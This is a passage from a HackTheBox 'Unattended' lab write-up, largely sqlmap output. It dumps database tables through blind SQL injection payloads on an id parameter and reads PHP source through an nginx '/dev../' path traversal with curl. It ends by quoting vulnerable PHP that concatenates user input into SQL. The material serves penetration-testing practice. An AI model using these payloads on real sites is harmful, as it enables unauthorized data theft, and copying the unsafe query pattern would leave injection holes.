class="line">[17:37:48] [INFO] resumed: 7</span><br><span class="line">[17:37:48] [INFO] resumed: offices</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 12</span><br><span class="line">[17:37:48] [INFO] resumed: orderdetails</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 6</span><br><span class="line">[17:37:48] [INFO] resumed: orders</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 8</span><br><span class="line">[17:37:48] [INFO] resumed: payments</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 12</span><br><span class="line">[17:37:48] [INFO] resumed: productlines</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 8</span><br><span class="line">[17:37:48] [INFO] resumed: products</span><br><span class="line">[17:37:48] [INFO] fetching columns for table 'customers' in database 'neddy'</span><br><span class="line">[17:37:48] [INFO] resumed: 13</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 14</span><br><span class="line">[17:37:48] [INFO] resumed: customerNumber</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 12</span><br><span class="line">[17:37:48] [INFO] resumed: customerName</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 15</span><br><span class="line">[17:37:48] [INFO] resumed: contactLastName</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 16</span><br><span class="line">[17:37:48] [INFO] resumed: contactFirstName</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 5</span><br><span class="line">[17:37:48] [INFO] resumed: phone</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 12</span><br><span class="line">[17:37:48] [INFO] resumed: addressLine1</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 12</span><br><span class="line">[17:37:48] [INFO] resumed: addressLine2</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 4</span><br><span class="line">[17:37:48] [INFO] resumed: city</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 5</span><br><span class="line">[17:37:48] [INFO] resumed: state</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 10</span><br><span class="line">[17:37:48] [INFO] resumed: postalCode</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 7</span><br><span class="line">[17:37:48] [INFO] resumed: country</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 22</span><br><span class="line">[17:37:48] [INFO] resumed: salesRepEmployeeNumber</span><br><span class="line">[17:37:48] [INFO] retrieving the length of query output</span><br><span class="line">[17:37:48] [INFO] resumed: 11</span><br><span class="line">[17:37:48] [INFO] resumed: creditLimit</span><br></pre></td></tr></table></figure>
<p>I only dumped <code>filepath</code> and <code>idname</code> because these are the ones I saw in the source of <code>index.php</code>.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended<span class="comment"># sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T filepath --dump --threads 10                  </span></span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[']_____ ___ ___  &#123;1.3.4#stable&#125; </span><br><span class="line">|_ -| . [)]     | .'| . | </span><br><span class="line">|___|_  ["]_|_|_|__,|  _| </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                            </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 17:55:21 /2019-08-23/</span></span><br><span class="line"><span class="string">[17:55:21] [INFO] resuming back-end DBMS '</span>mysql<span class="string">'</span></span><br><span class="line"><span class="string">[17:55:21] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:                       </span></span><br><span class="line"><span class="string">---        </span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: id=465'</span> <span class="keyword">AND</span> <span class="number">6602</span>=<span class="number">6602</span> <span class="keyword">AND</span> <span class="string">'YxJr'</span>=<span class="string">'YxJr</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: id=465'</span> <span class="keyword">AND</span> <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="keyword">AND</span> <span class="string">'APKt'</span>=<span class="string">'APKt</span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[17:55:22] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web application technology: Nginx 1.10.3</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[17:55:22] [INFO] fetching columns for table '</span>filepath<span class="string">' in database '</span>neddy<span class="string">'</span></span><br><span class="line"><span class="string">[17:55:22] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[17:55:27] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:55:27] [INFO] retrieved: 4</span></span><br><span class="line"><span class="string">[17:55:36] [INFO] retrieved: name</span></span><br><span class="line"><span class="string">[17:55:36] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:55:36] [INFO] retrieved: 4</span></span><br><span class="line"><span class="string">[17:55:44] [INFO] retrieved: path</span></span><br><span class="line"><span class="string">[17:55:44] [INFO] fetching entries for table '</span>filepath<span class="string">' in database '</span>neddy<span class="string">'</span></span><br><span class="line"><span class="string">[17:55:44] [INFO] fetching number of entries for table '</span>filepath<span class="string">' in database '</span>neddy<span class="string">'</span></span><br><span class="line"><span class="string">[17:55:44] [INFO] retrieved: 3</span></span><br><span class="line"><span class="string">[17:55:49] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:55:49] [INFO] retrieved: 36</span></span><br><span class="line"><span class="string">[17:56:25] [INFO] retrieved: 47c1ba4f7b1edf28ea0e2bb250717093.php</span></span><br><span class="line"><span class="string">[17:56:25] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:56:25] [INFO] retrieved: 5</span></span><br><span class="line"><span class="string">[17:56:35] [INFO] retrieved: about</span></span><br><span class="line"><span class="string">[17:56:35] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:56:35] [INFO] retrieved: 36</span></span><br><span class="line"><span class="string">[17:57:10] [INFO] retrieved: 0f710bba8d16303a415266af8bb52fcb.php</span></span><br><span class="line"><span class="string">[17:57:10] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:57:10] [INFO] retrieved: 7</span></span><br><span class="line"><span class="string">[17:57:21] [INFO] retrieved: contact</span></span><br><span class="line"><span class="string">[17:57:21] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:57:21] [INFO] retrieved: 36</span></span><br><span class="line"><span class="string">[17:57:55] [INFO] retrieved: 787c75233b93aa5e45c3f85d130bfbe7.php</span></span><br><span class="line"><span class="string">[17:57:55] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[17:57:55] [INFO] retrieved: 4</span></span><br><span class="line"><span class="string">[17:58:05] [INFO] retrieved: main</span></span><br><span class="line"><span class="string">Database: neddy</span></span><br><span class="line"><span class="string">Table: filepath</span></span><br><span class="line"><span class="string">[3 entries]</span></span><br><span class="line"><span class="string">+---------+--------------------------------------+</span></span><br><span class="line"><span class="string">| name    | path                                 |</span></span><br><span class="line"><span class="string">+---------+--------------------------------------+</span></span><br><span class="line"><span class="string">| about   | 47c1ba4f7b1edf28ea0e2bb250717093.php |</span></span><br><span class="line"><span class="string">| contact | 0f710bba8d16303a415266af8bb52fcb.php |</span></span><br><span class="line"><span class="string">| main    | 787c75233b93aa5e45c3f85d130bfbe7.php |</span></span><br><span class="line"><span class="string">+---------+--------------------------------------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[17:58:05] [INFO] table '</span>neddy.filepath<span class="string">' dumped to CSV file '</span>/root/.sqlmap/<span class="keyword">output</span>/www.nestedflanders.htb/dump/neddy/filepath.csv<span class="string">'             </span></span><br><span class="line"><span class="string">[17:58:05] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/<span class="keyword">output</span>/www.nestedflanders.htb<span class="string">'</span></span><br><span class="line"><span class="string">[*] ending @ 17:58:05 /2019-08-23/</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended<span class="comment"># sqlmap -u https://www.nestedflanders.htb/index.php?id=465 -D neddy -T idname --dump --threads 10</span></span><br><span class="line">        ___               </span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.3.4#stable&#125; </span><br><span class="line">|_ -| . [)]     | .'| . |  </span><br><span class="line">|___|_  ["]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                            </span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the <span class="keyword">end</span> <span class="keyword">user</span><span class="string">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program           </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] starting @ 18:03:42 /2019-08-23/</span></span><br><span class="line"><span class="string">[18:03:42] [INFO] resuming back-end DBMS '</span>mysql<span class="string">'</span></span><br><span class="line"><span class="string">[18:03:42] [INFO] testing connection to the target URL</span></span><br><span class="line"><span class="string">sqlmap resumed the following injection point(s) from stored session:                       </span></span><br><span class="line"><span class="string">---        </span></span><br><span class="line"><span class="string">Parameter: id (GET)</span></span><br><span class="line"><span class="string">    Type: boolean-based blind</span></span><br><span class="line"><span class="string">    Title: AND boolean-based blind - WHERE or HAVING clause</span></span><br><span class="line"><span class="string">    Payload: id=465'</span> <span class="keyword">AND</span> <span class="number">6602</span>=<span class="number">6602</span> <span class="keyword">AND</span> <span class="string">'YxJr'</span>=<span class="string">'YxJr</span></span><br><span class="line"><span class="string">    Type: time-based blind</span></span><br><span class="line"><span class="string">    Title: MySQL &gt;= 5.0.12 AND time-based blind</span></span><br><span class="line"><span class="string">    Payload: id=465'</span> <span class="keyword">AND</span> <span class="keyword">SLEEP</span>(<span class="number">5</span>) <span class="keyword">AND</span> <span class="string">'APKt'</span>=<span class="string">'APKt                       </span></span><br><span class="line"><span class="string">---</span></span><br><span class="line"><span class="string">[18:03:43] [INFO] the back-end DBMS is MySQL</span></span><br><span class="line"><span class="string">web application technology: Nginx 1.10.3</span></span><br><span class="line"><span class="string">back-end DBMS: MySQL &gt;= 5.0.12</span></span><br><span class="line"><span class="string">[18:03:43] [INFO] fetching columns for table '</span>idname<span class="string">' in database '</span>neddy<span class="string">'</span></span><br><span class="line"><span class="string">[18:03:43] [INFO] resumed: 3</span></span><br><span class="line"><span class="string">[18:03:43] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:03:43] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[18:03:52] [INFO] retrieved: id</span></span><br><span class="line"><span class="string">[18:03:52] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:03:52] [INFO] retrieved: 4</span></span><br><span class="line"><span class="string">[18:04:02] [INFO] retrieved: name</span></span><br><span class="line"><span class="string">[18:04:02] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:04:02] [INFO] retrieved: 8</span></span><br><span class="line"><span class="string">[18:04:12] [INFO] retrieved: disabled</span></span><br><span class="line"><span class="string">[18:04:12] [INFO] fetching entries for table '</span>idname<span class="string">' in database '</span>neddy<span class="string">'</span></span><br><span class="line"><span class="string">[18:04:12] [INFO] fetching number of entries for table '</span>idname<span class="string">' in database '</span>neddy<span class="string">'</span></span><br><span class="line"><span class="string">[18:04:12] [INFO] retrieved: 6</span></span><br><span class="line"><span class="string">[18:04:17] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:04:17] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:04:21] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:04:27] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:04:27] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:04:33] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:04:39] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:04:39] [INFO] retrieved: 8</span></span><br><span class="line"><span class="string">[18:04:51] [INFO] retrieved: main.php</span></span><br><span class="line"><span class="string">[18:04:51] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:04:51] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:04:55] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:05:01] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:05:01] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:05:05] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[18:05:12] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:05:12] [INFO] retrieved: 9</span></span><br><span class="line"><span class="string">[18:05:24] [INFO] retrieved: about.php</span></span><br><span class="line"><span class="string">[18:05:24] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:05:24] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:05:28] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:05:34] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:05:34] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:05:38] [INFO] retrieved: 3</span></span><br><span class="line"><span class="string">[18:05:44] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:05:44] [INFO] retrieved: 11</span></span><br><span class="line"><span class="string">[18:06:01] [INFO] retrieved: contact.php</span></span><br><span class="line"><span class="string">[18:06:01] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:06:01] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:06:05] [INFO] retrieved: 0</span></span><br><span class="line"><span class="string">[18:06:11] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:06:11] [INFO] retrieved: 2</span></span><br><span class="line"><span class="string">[18:06:21] [INFO] retrieved: 25</span></span><br><span class="line"><span class="string">[18:06:21] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:06:21] [INFO] retrieved: 4</span></span><br><span class="line"><span class="string">[18:06:31] [INFO] retrieved: main</span></span><br><span class="line"><span class="string">[18:06:31] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:06:31] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:06:35] [INFO] retrieved: 0</span></span><br><span class="line"><span class="string">[18:06:41] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:06:41] [INFO] retrieved: 3</span></span><br><span class="line"><span class="string">[18:06:51] [INFO] retrieved: 465</span></span><br><span class="line"><span class="string">[18:06:51] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:06:51] [INFO] retrieved: 5</span></span><br><span class="line"><span class="string">[18:07:01] [INFO] retrieved: about</span></span><br><span class="line"><span class="string">[18:07:01] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:07:01] [INFO] retrieved: 1</span></span><br><span class="line"><span class="string">[18:07:05] [INFO] retrieved: 0</span></span><br><span class="line"><span class="string">[18:07:12] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:07:12] [INFO] retrieved: 3</span></span><br><span class="line"><span class="string">[18:07:22] [INFO] retrieved: 587</span></span><br><span class="line"><span class="string">[18:07:22] [INFO] retrieving the length of query output</span></span><br><span class="line"><span class="string">[18:07:22] [INFO] retrieved: 7</span></span><br><span class="line"><span class="string">[18:07:32] [INFO] retrieved: contact</span></span><br><span class="line"><span class="string">Database: neddy</span></span><br><span class="line"><span class="string">Table: idname</span></span><br><span class="line"><span class="string">[6 entries]</span></span><br><span class="line"><span class="string">+-----+-------------+----------+</span></span><br><span class="line"><span class="string">| id  | name        | disabled |</span></span><br><span class="line"><span class="string">+-----+-------------+----------+</span></span><br><span class="line"><span class="string">| 1   | main.php    | 1        |</span></span><br><span class="line"><span class="string">| 2   | about.php   | 1        |</span></span><br><span class="line"><span class="string">| 3   | contact.php | 1        |</span></span><br><span class="line"><span class="string">| 25  | main        | 0        |</span></span><br><span class="line"><span class="string">| 465 | about       | 0        |</span></span><br><span class="line"><span class="string">| 587 | contact     | 0        |</span></span><br><span class="line"><span class="string">+-----+-------------+----------+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[18:07:32] [INFO] table '</span>neddy.idname<span class="string">' dumped to CSV file '</span>/root/.sqlmap/<span class="keyword">output</span>/www.nestedflanders.htb/dump/neddy/idname.csv<span class="string">'               </span></span><br><span class="line"><span class="string">[18:07:32] [INFO] fetched data logged to text files under '</span>/root/.sqlmap/<span class="keyword">output</span>/www.nestedflanders.htb<span class="string">'</span></span><br><span class="line"><span class="string">[*] ending @ 18:07:32 /2019-08-23/</span></span><br></pre></td></tr></table></figure>


<h2 id="SQLI-to-LFI"><a href="#SQLI-to-LFI" class="headerlink" title="SQLI to LFI"></a>SQLI to LFI</h2><p>Now we have the actual file names, <code>about</code> for example (<code>/47c1ba4f7b1edf28ea0e2bb250717093.php</code>) :<br><img src="/images/hackthebox/unattended/14.png" alt=""><br>It’s just the text and nothing else. We can also verify that there is nothing hidden by checking the <code>php</code> source of the three pages :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/47c1ba4f7b1edf28ea0e2bb250717093.php</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">Hello <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) ? $_GET[<span class="string">'name'</span>] : <span class="string">"visitor"</span> ; <span class="meta">?&gt;</span></span>,</span><br><span class="line">our Company is world wide leading expert about Nesting stuff.<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">We can nest almost everything after or before anything based on your needs.</span><br><span class="line">Feel free to contact us with usual email addresses, our contact form is currently offline because of a recent attack.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/0f710bba8d16303a415266af8bb52fcb.php</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">Hello <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) ? $_GET[<span class="string">'name'</span>] : <span class="string">"visitor"</span> ; <span class="meta">?&gt;</span></span>,</span><br><span class="line"></span><br><span class="line">thanks for getting in touch with us!</span><br><span class="line">Unfortunately our server is under *heavy* attack and we disable almost every dynamic page.</span><br><span class="line">Please come back later.<span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/787c75233b93aa5e45c3f85d130bfbe7.php</span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">787c75233b93aa5e45c3f85d130bfbe7.gif</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">Hello <span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>])) ? $_GET[<span class="string">'name'</span>] : <span class="string">"visitor"</span> ; <span class="meta">?&gt;</span></span>,</span><br><span class="line">we are very sorry to show you this ridiculous page but we had to restore our website to 2001-layout.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">As a partial recover, we offer you a printed portfolio: just drop us an email with a contact request.</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>First guess will be that the page name gets queried from the database table <code>idname</code> then the path (or the actual <code>php</code> file name) gets queried from the database table <code>filepath</code> then it includes that page to the index page. And that’s true but since we have the source of <code>index.php</code> let’s also look at it.<br>By looking at the dumped tables and the source of <code>index.php</code> again we can understand the following :<br>The <code>SQL</code> injectable query we just exploited is part of the function <code>getTplFromID</code> which returns the page name after querying it from the table <code>idname</code> based on our given id number :<br>Function <code>getTplFromID()</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTplFromID</span><span class="params">($conn)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $debug;</span><br><span class="line">	$valid_ids = <span class="keyword">array</span> (<span class="number">25</span>,<span class="number">465</span>,<span class="number">587</span>);</span><br><span class="line">	<span class="keyword">if</span> ( (array_key_exists(<span class="string">'id'</span>, $_GET)) &amp;&amp; (intval($_GET[<span class="string">'id'</span>]) == $_GET[<span class="string">'id'</span>]) &amp;&amp; (in_array(intval($_GET[<span class="string">'id'</span>]),$valid_ids)) ) &#123;</span><br><span class="line">			$sql = <span class="string">"SELECT name FROM idname where id = '"</span>.$_GET[<span class="string">'id'</span>].<span class="string">"'"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$sql = <span class="string">"SELECT name FROM idname where id = '25'"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"sqltpl: $sql\n"</span>; &#125; </span><br><span class="line">	</span><br><span class="line">	$result = $conn-&gt;query($sql);</span><br><span class="line">	<span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">while</span>($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">		$ret = $row[<span class="string">'name'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		$ret = <span class="string">'main'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($debug) &#123; <span class="keyword">echo</span> <span class="string">"rettpl: $ret\n"</span>; &#125;</span><br><span class="line">	<span class="keyword">return</span> $ret;</span><br><span 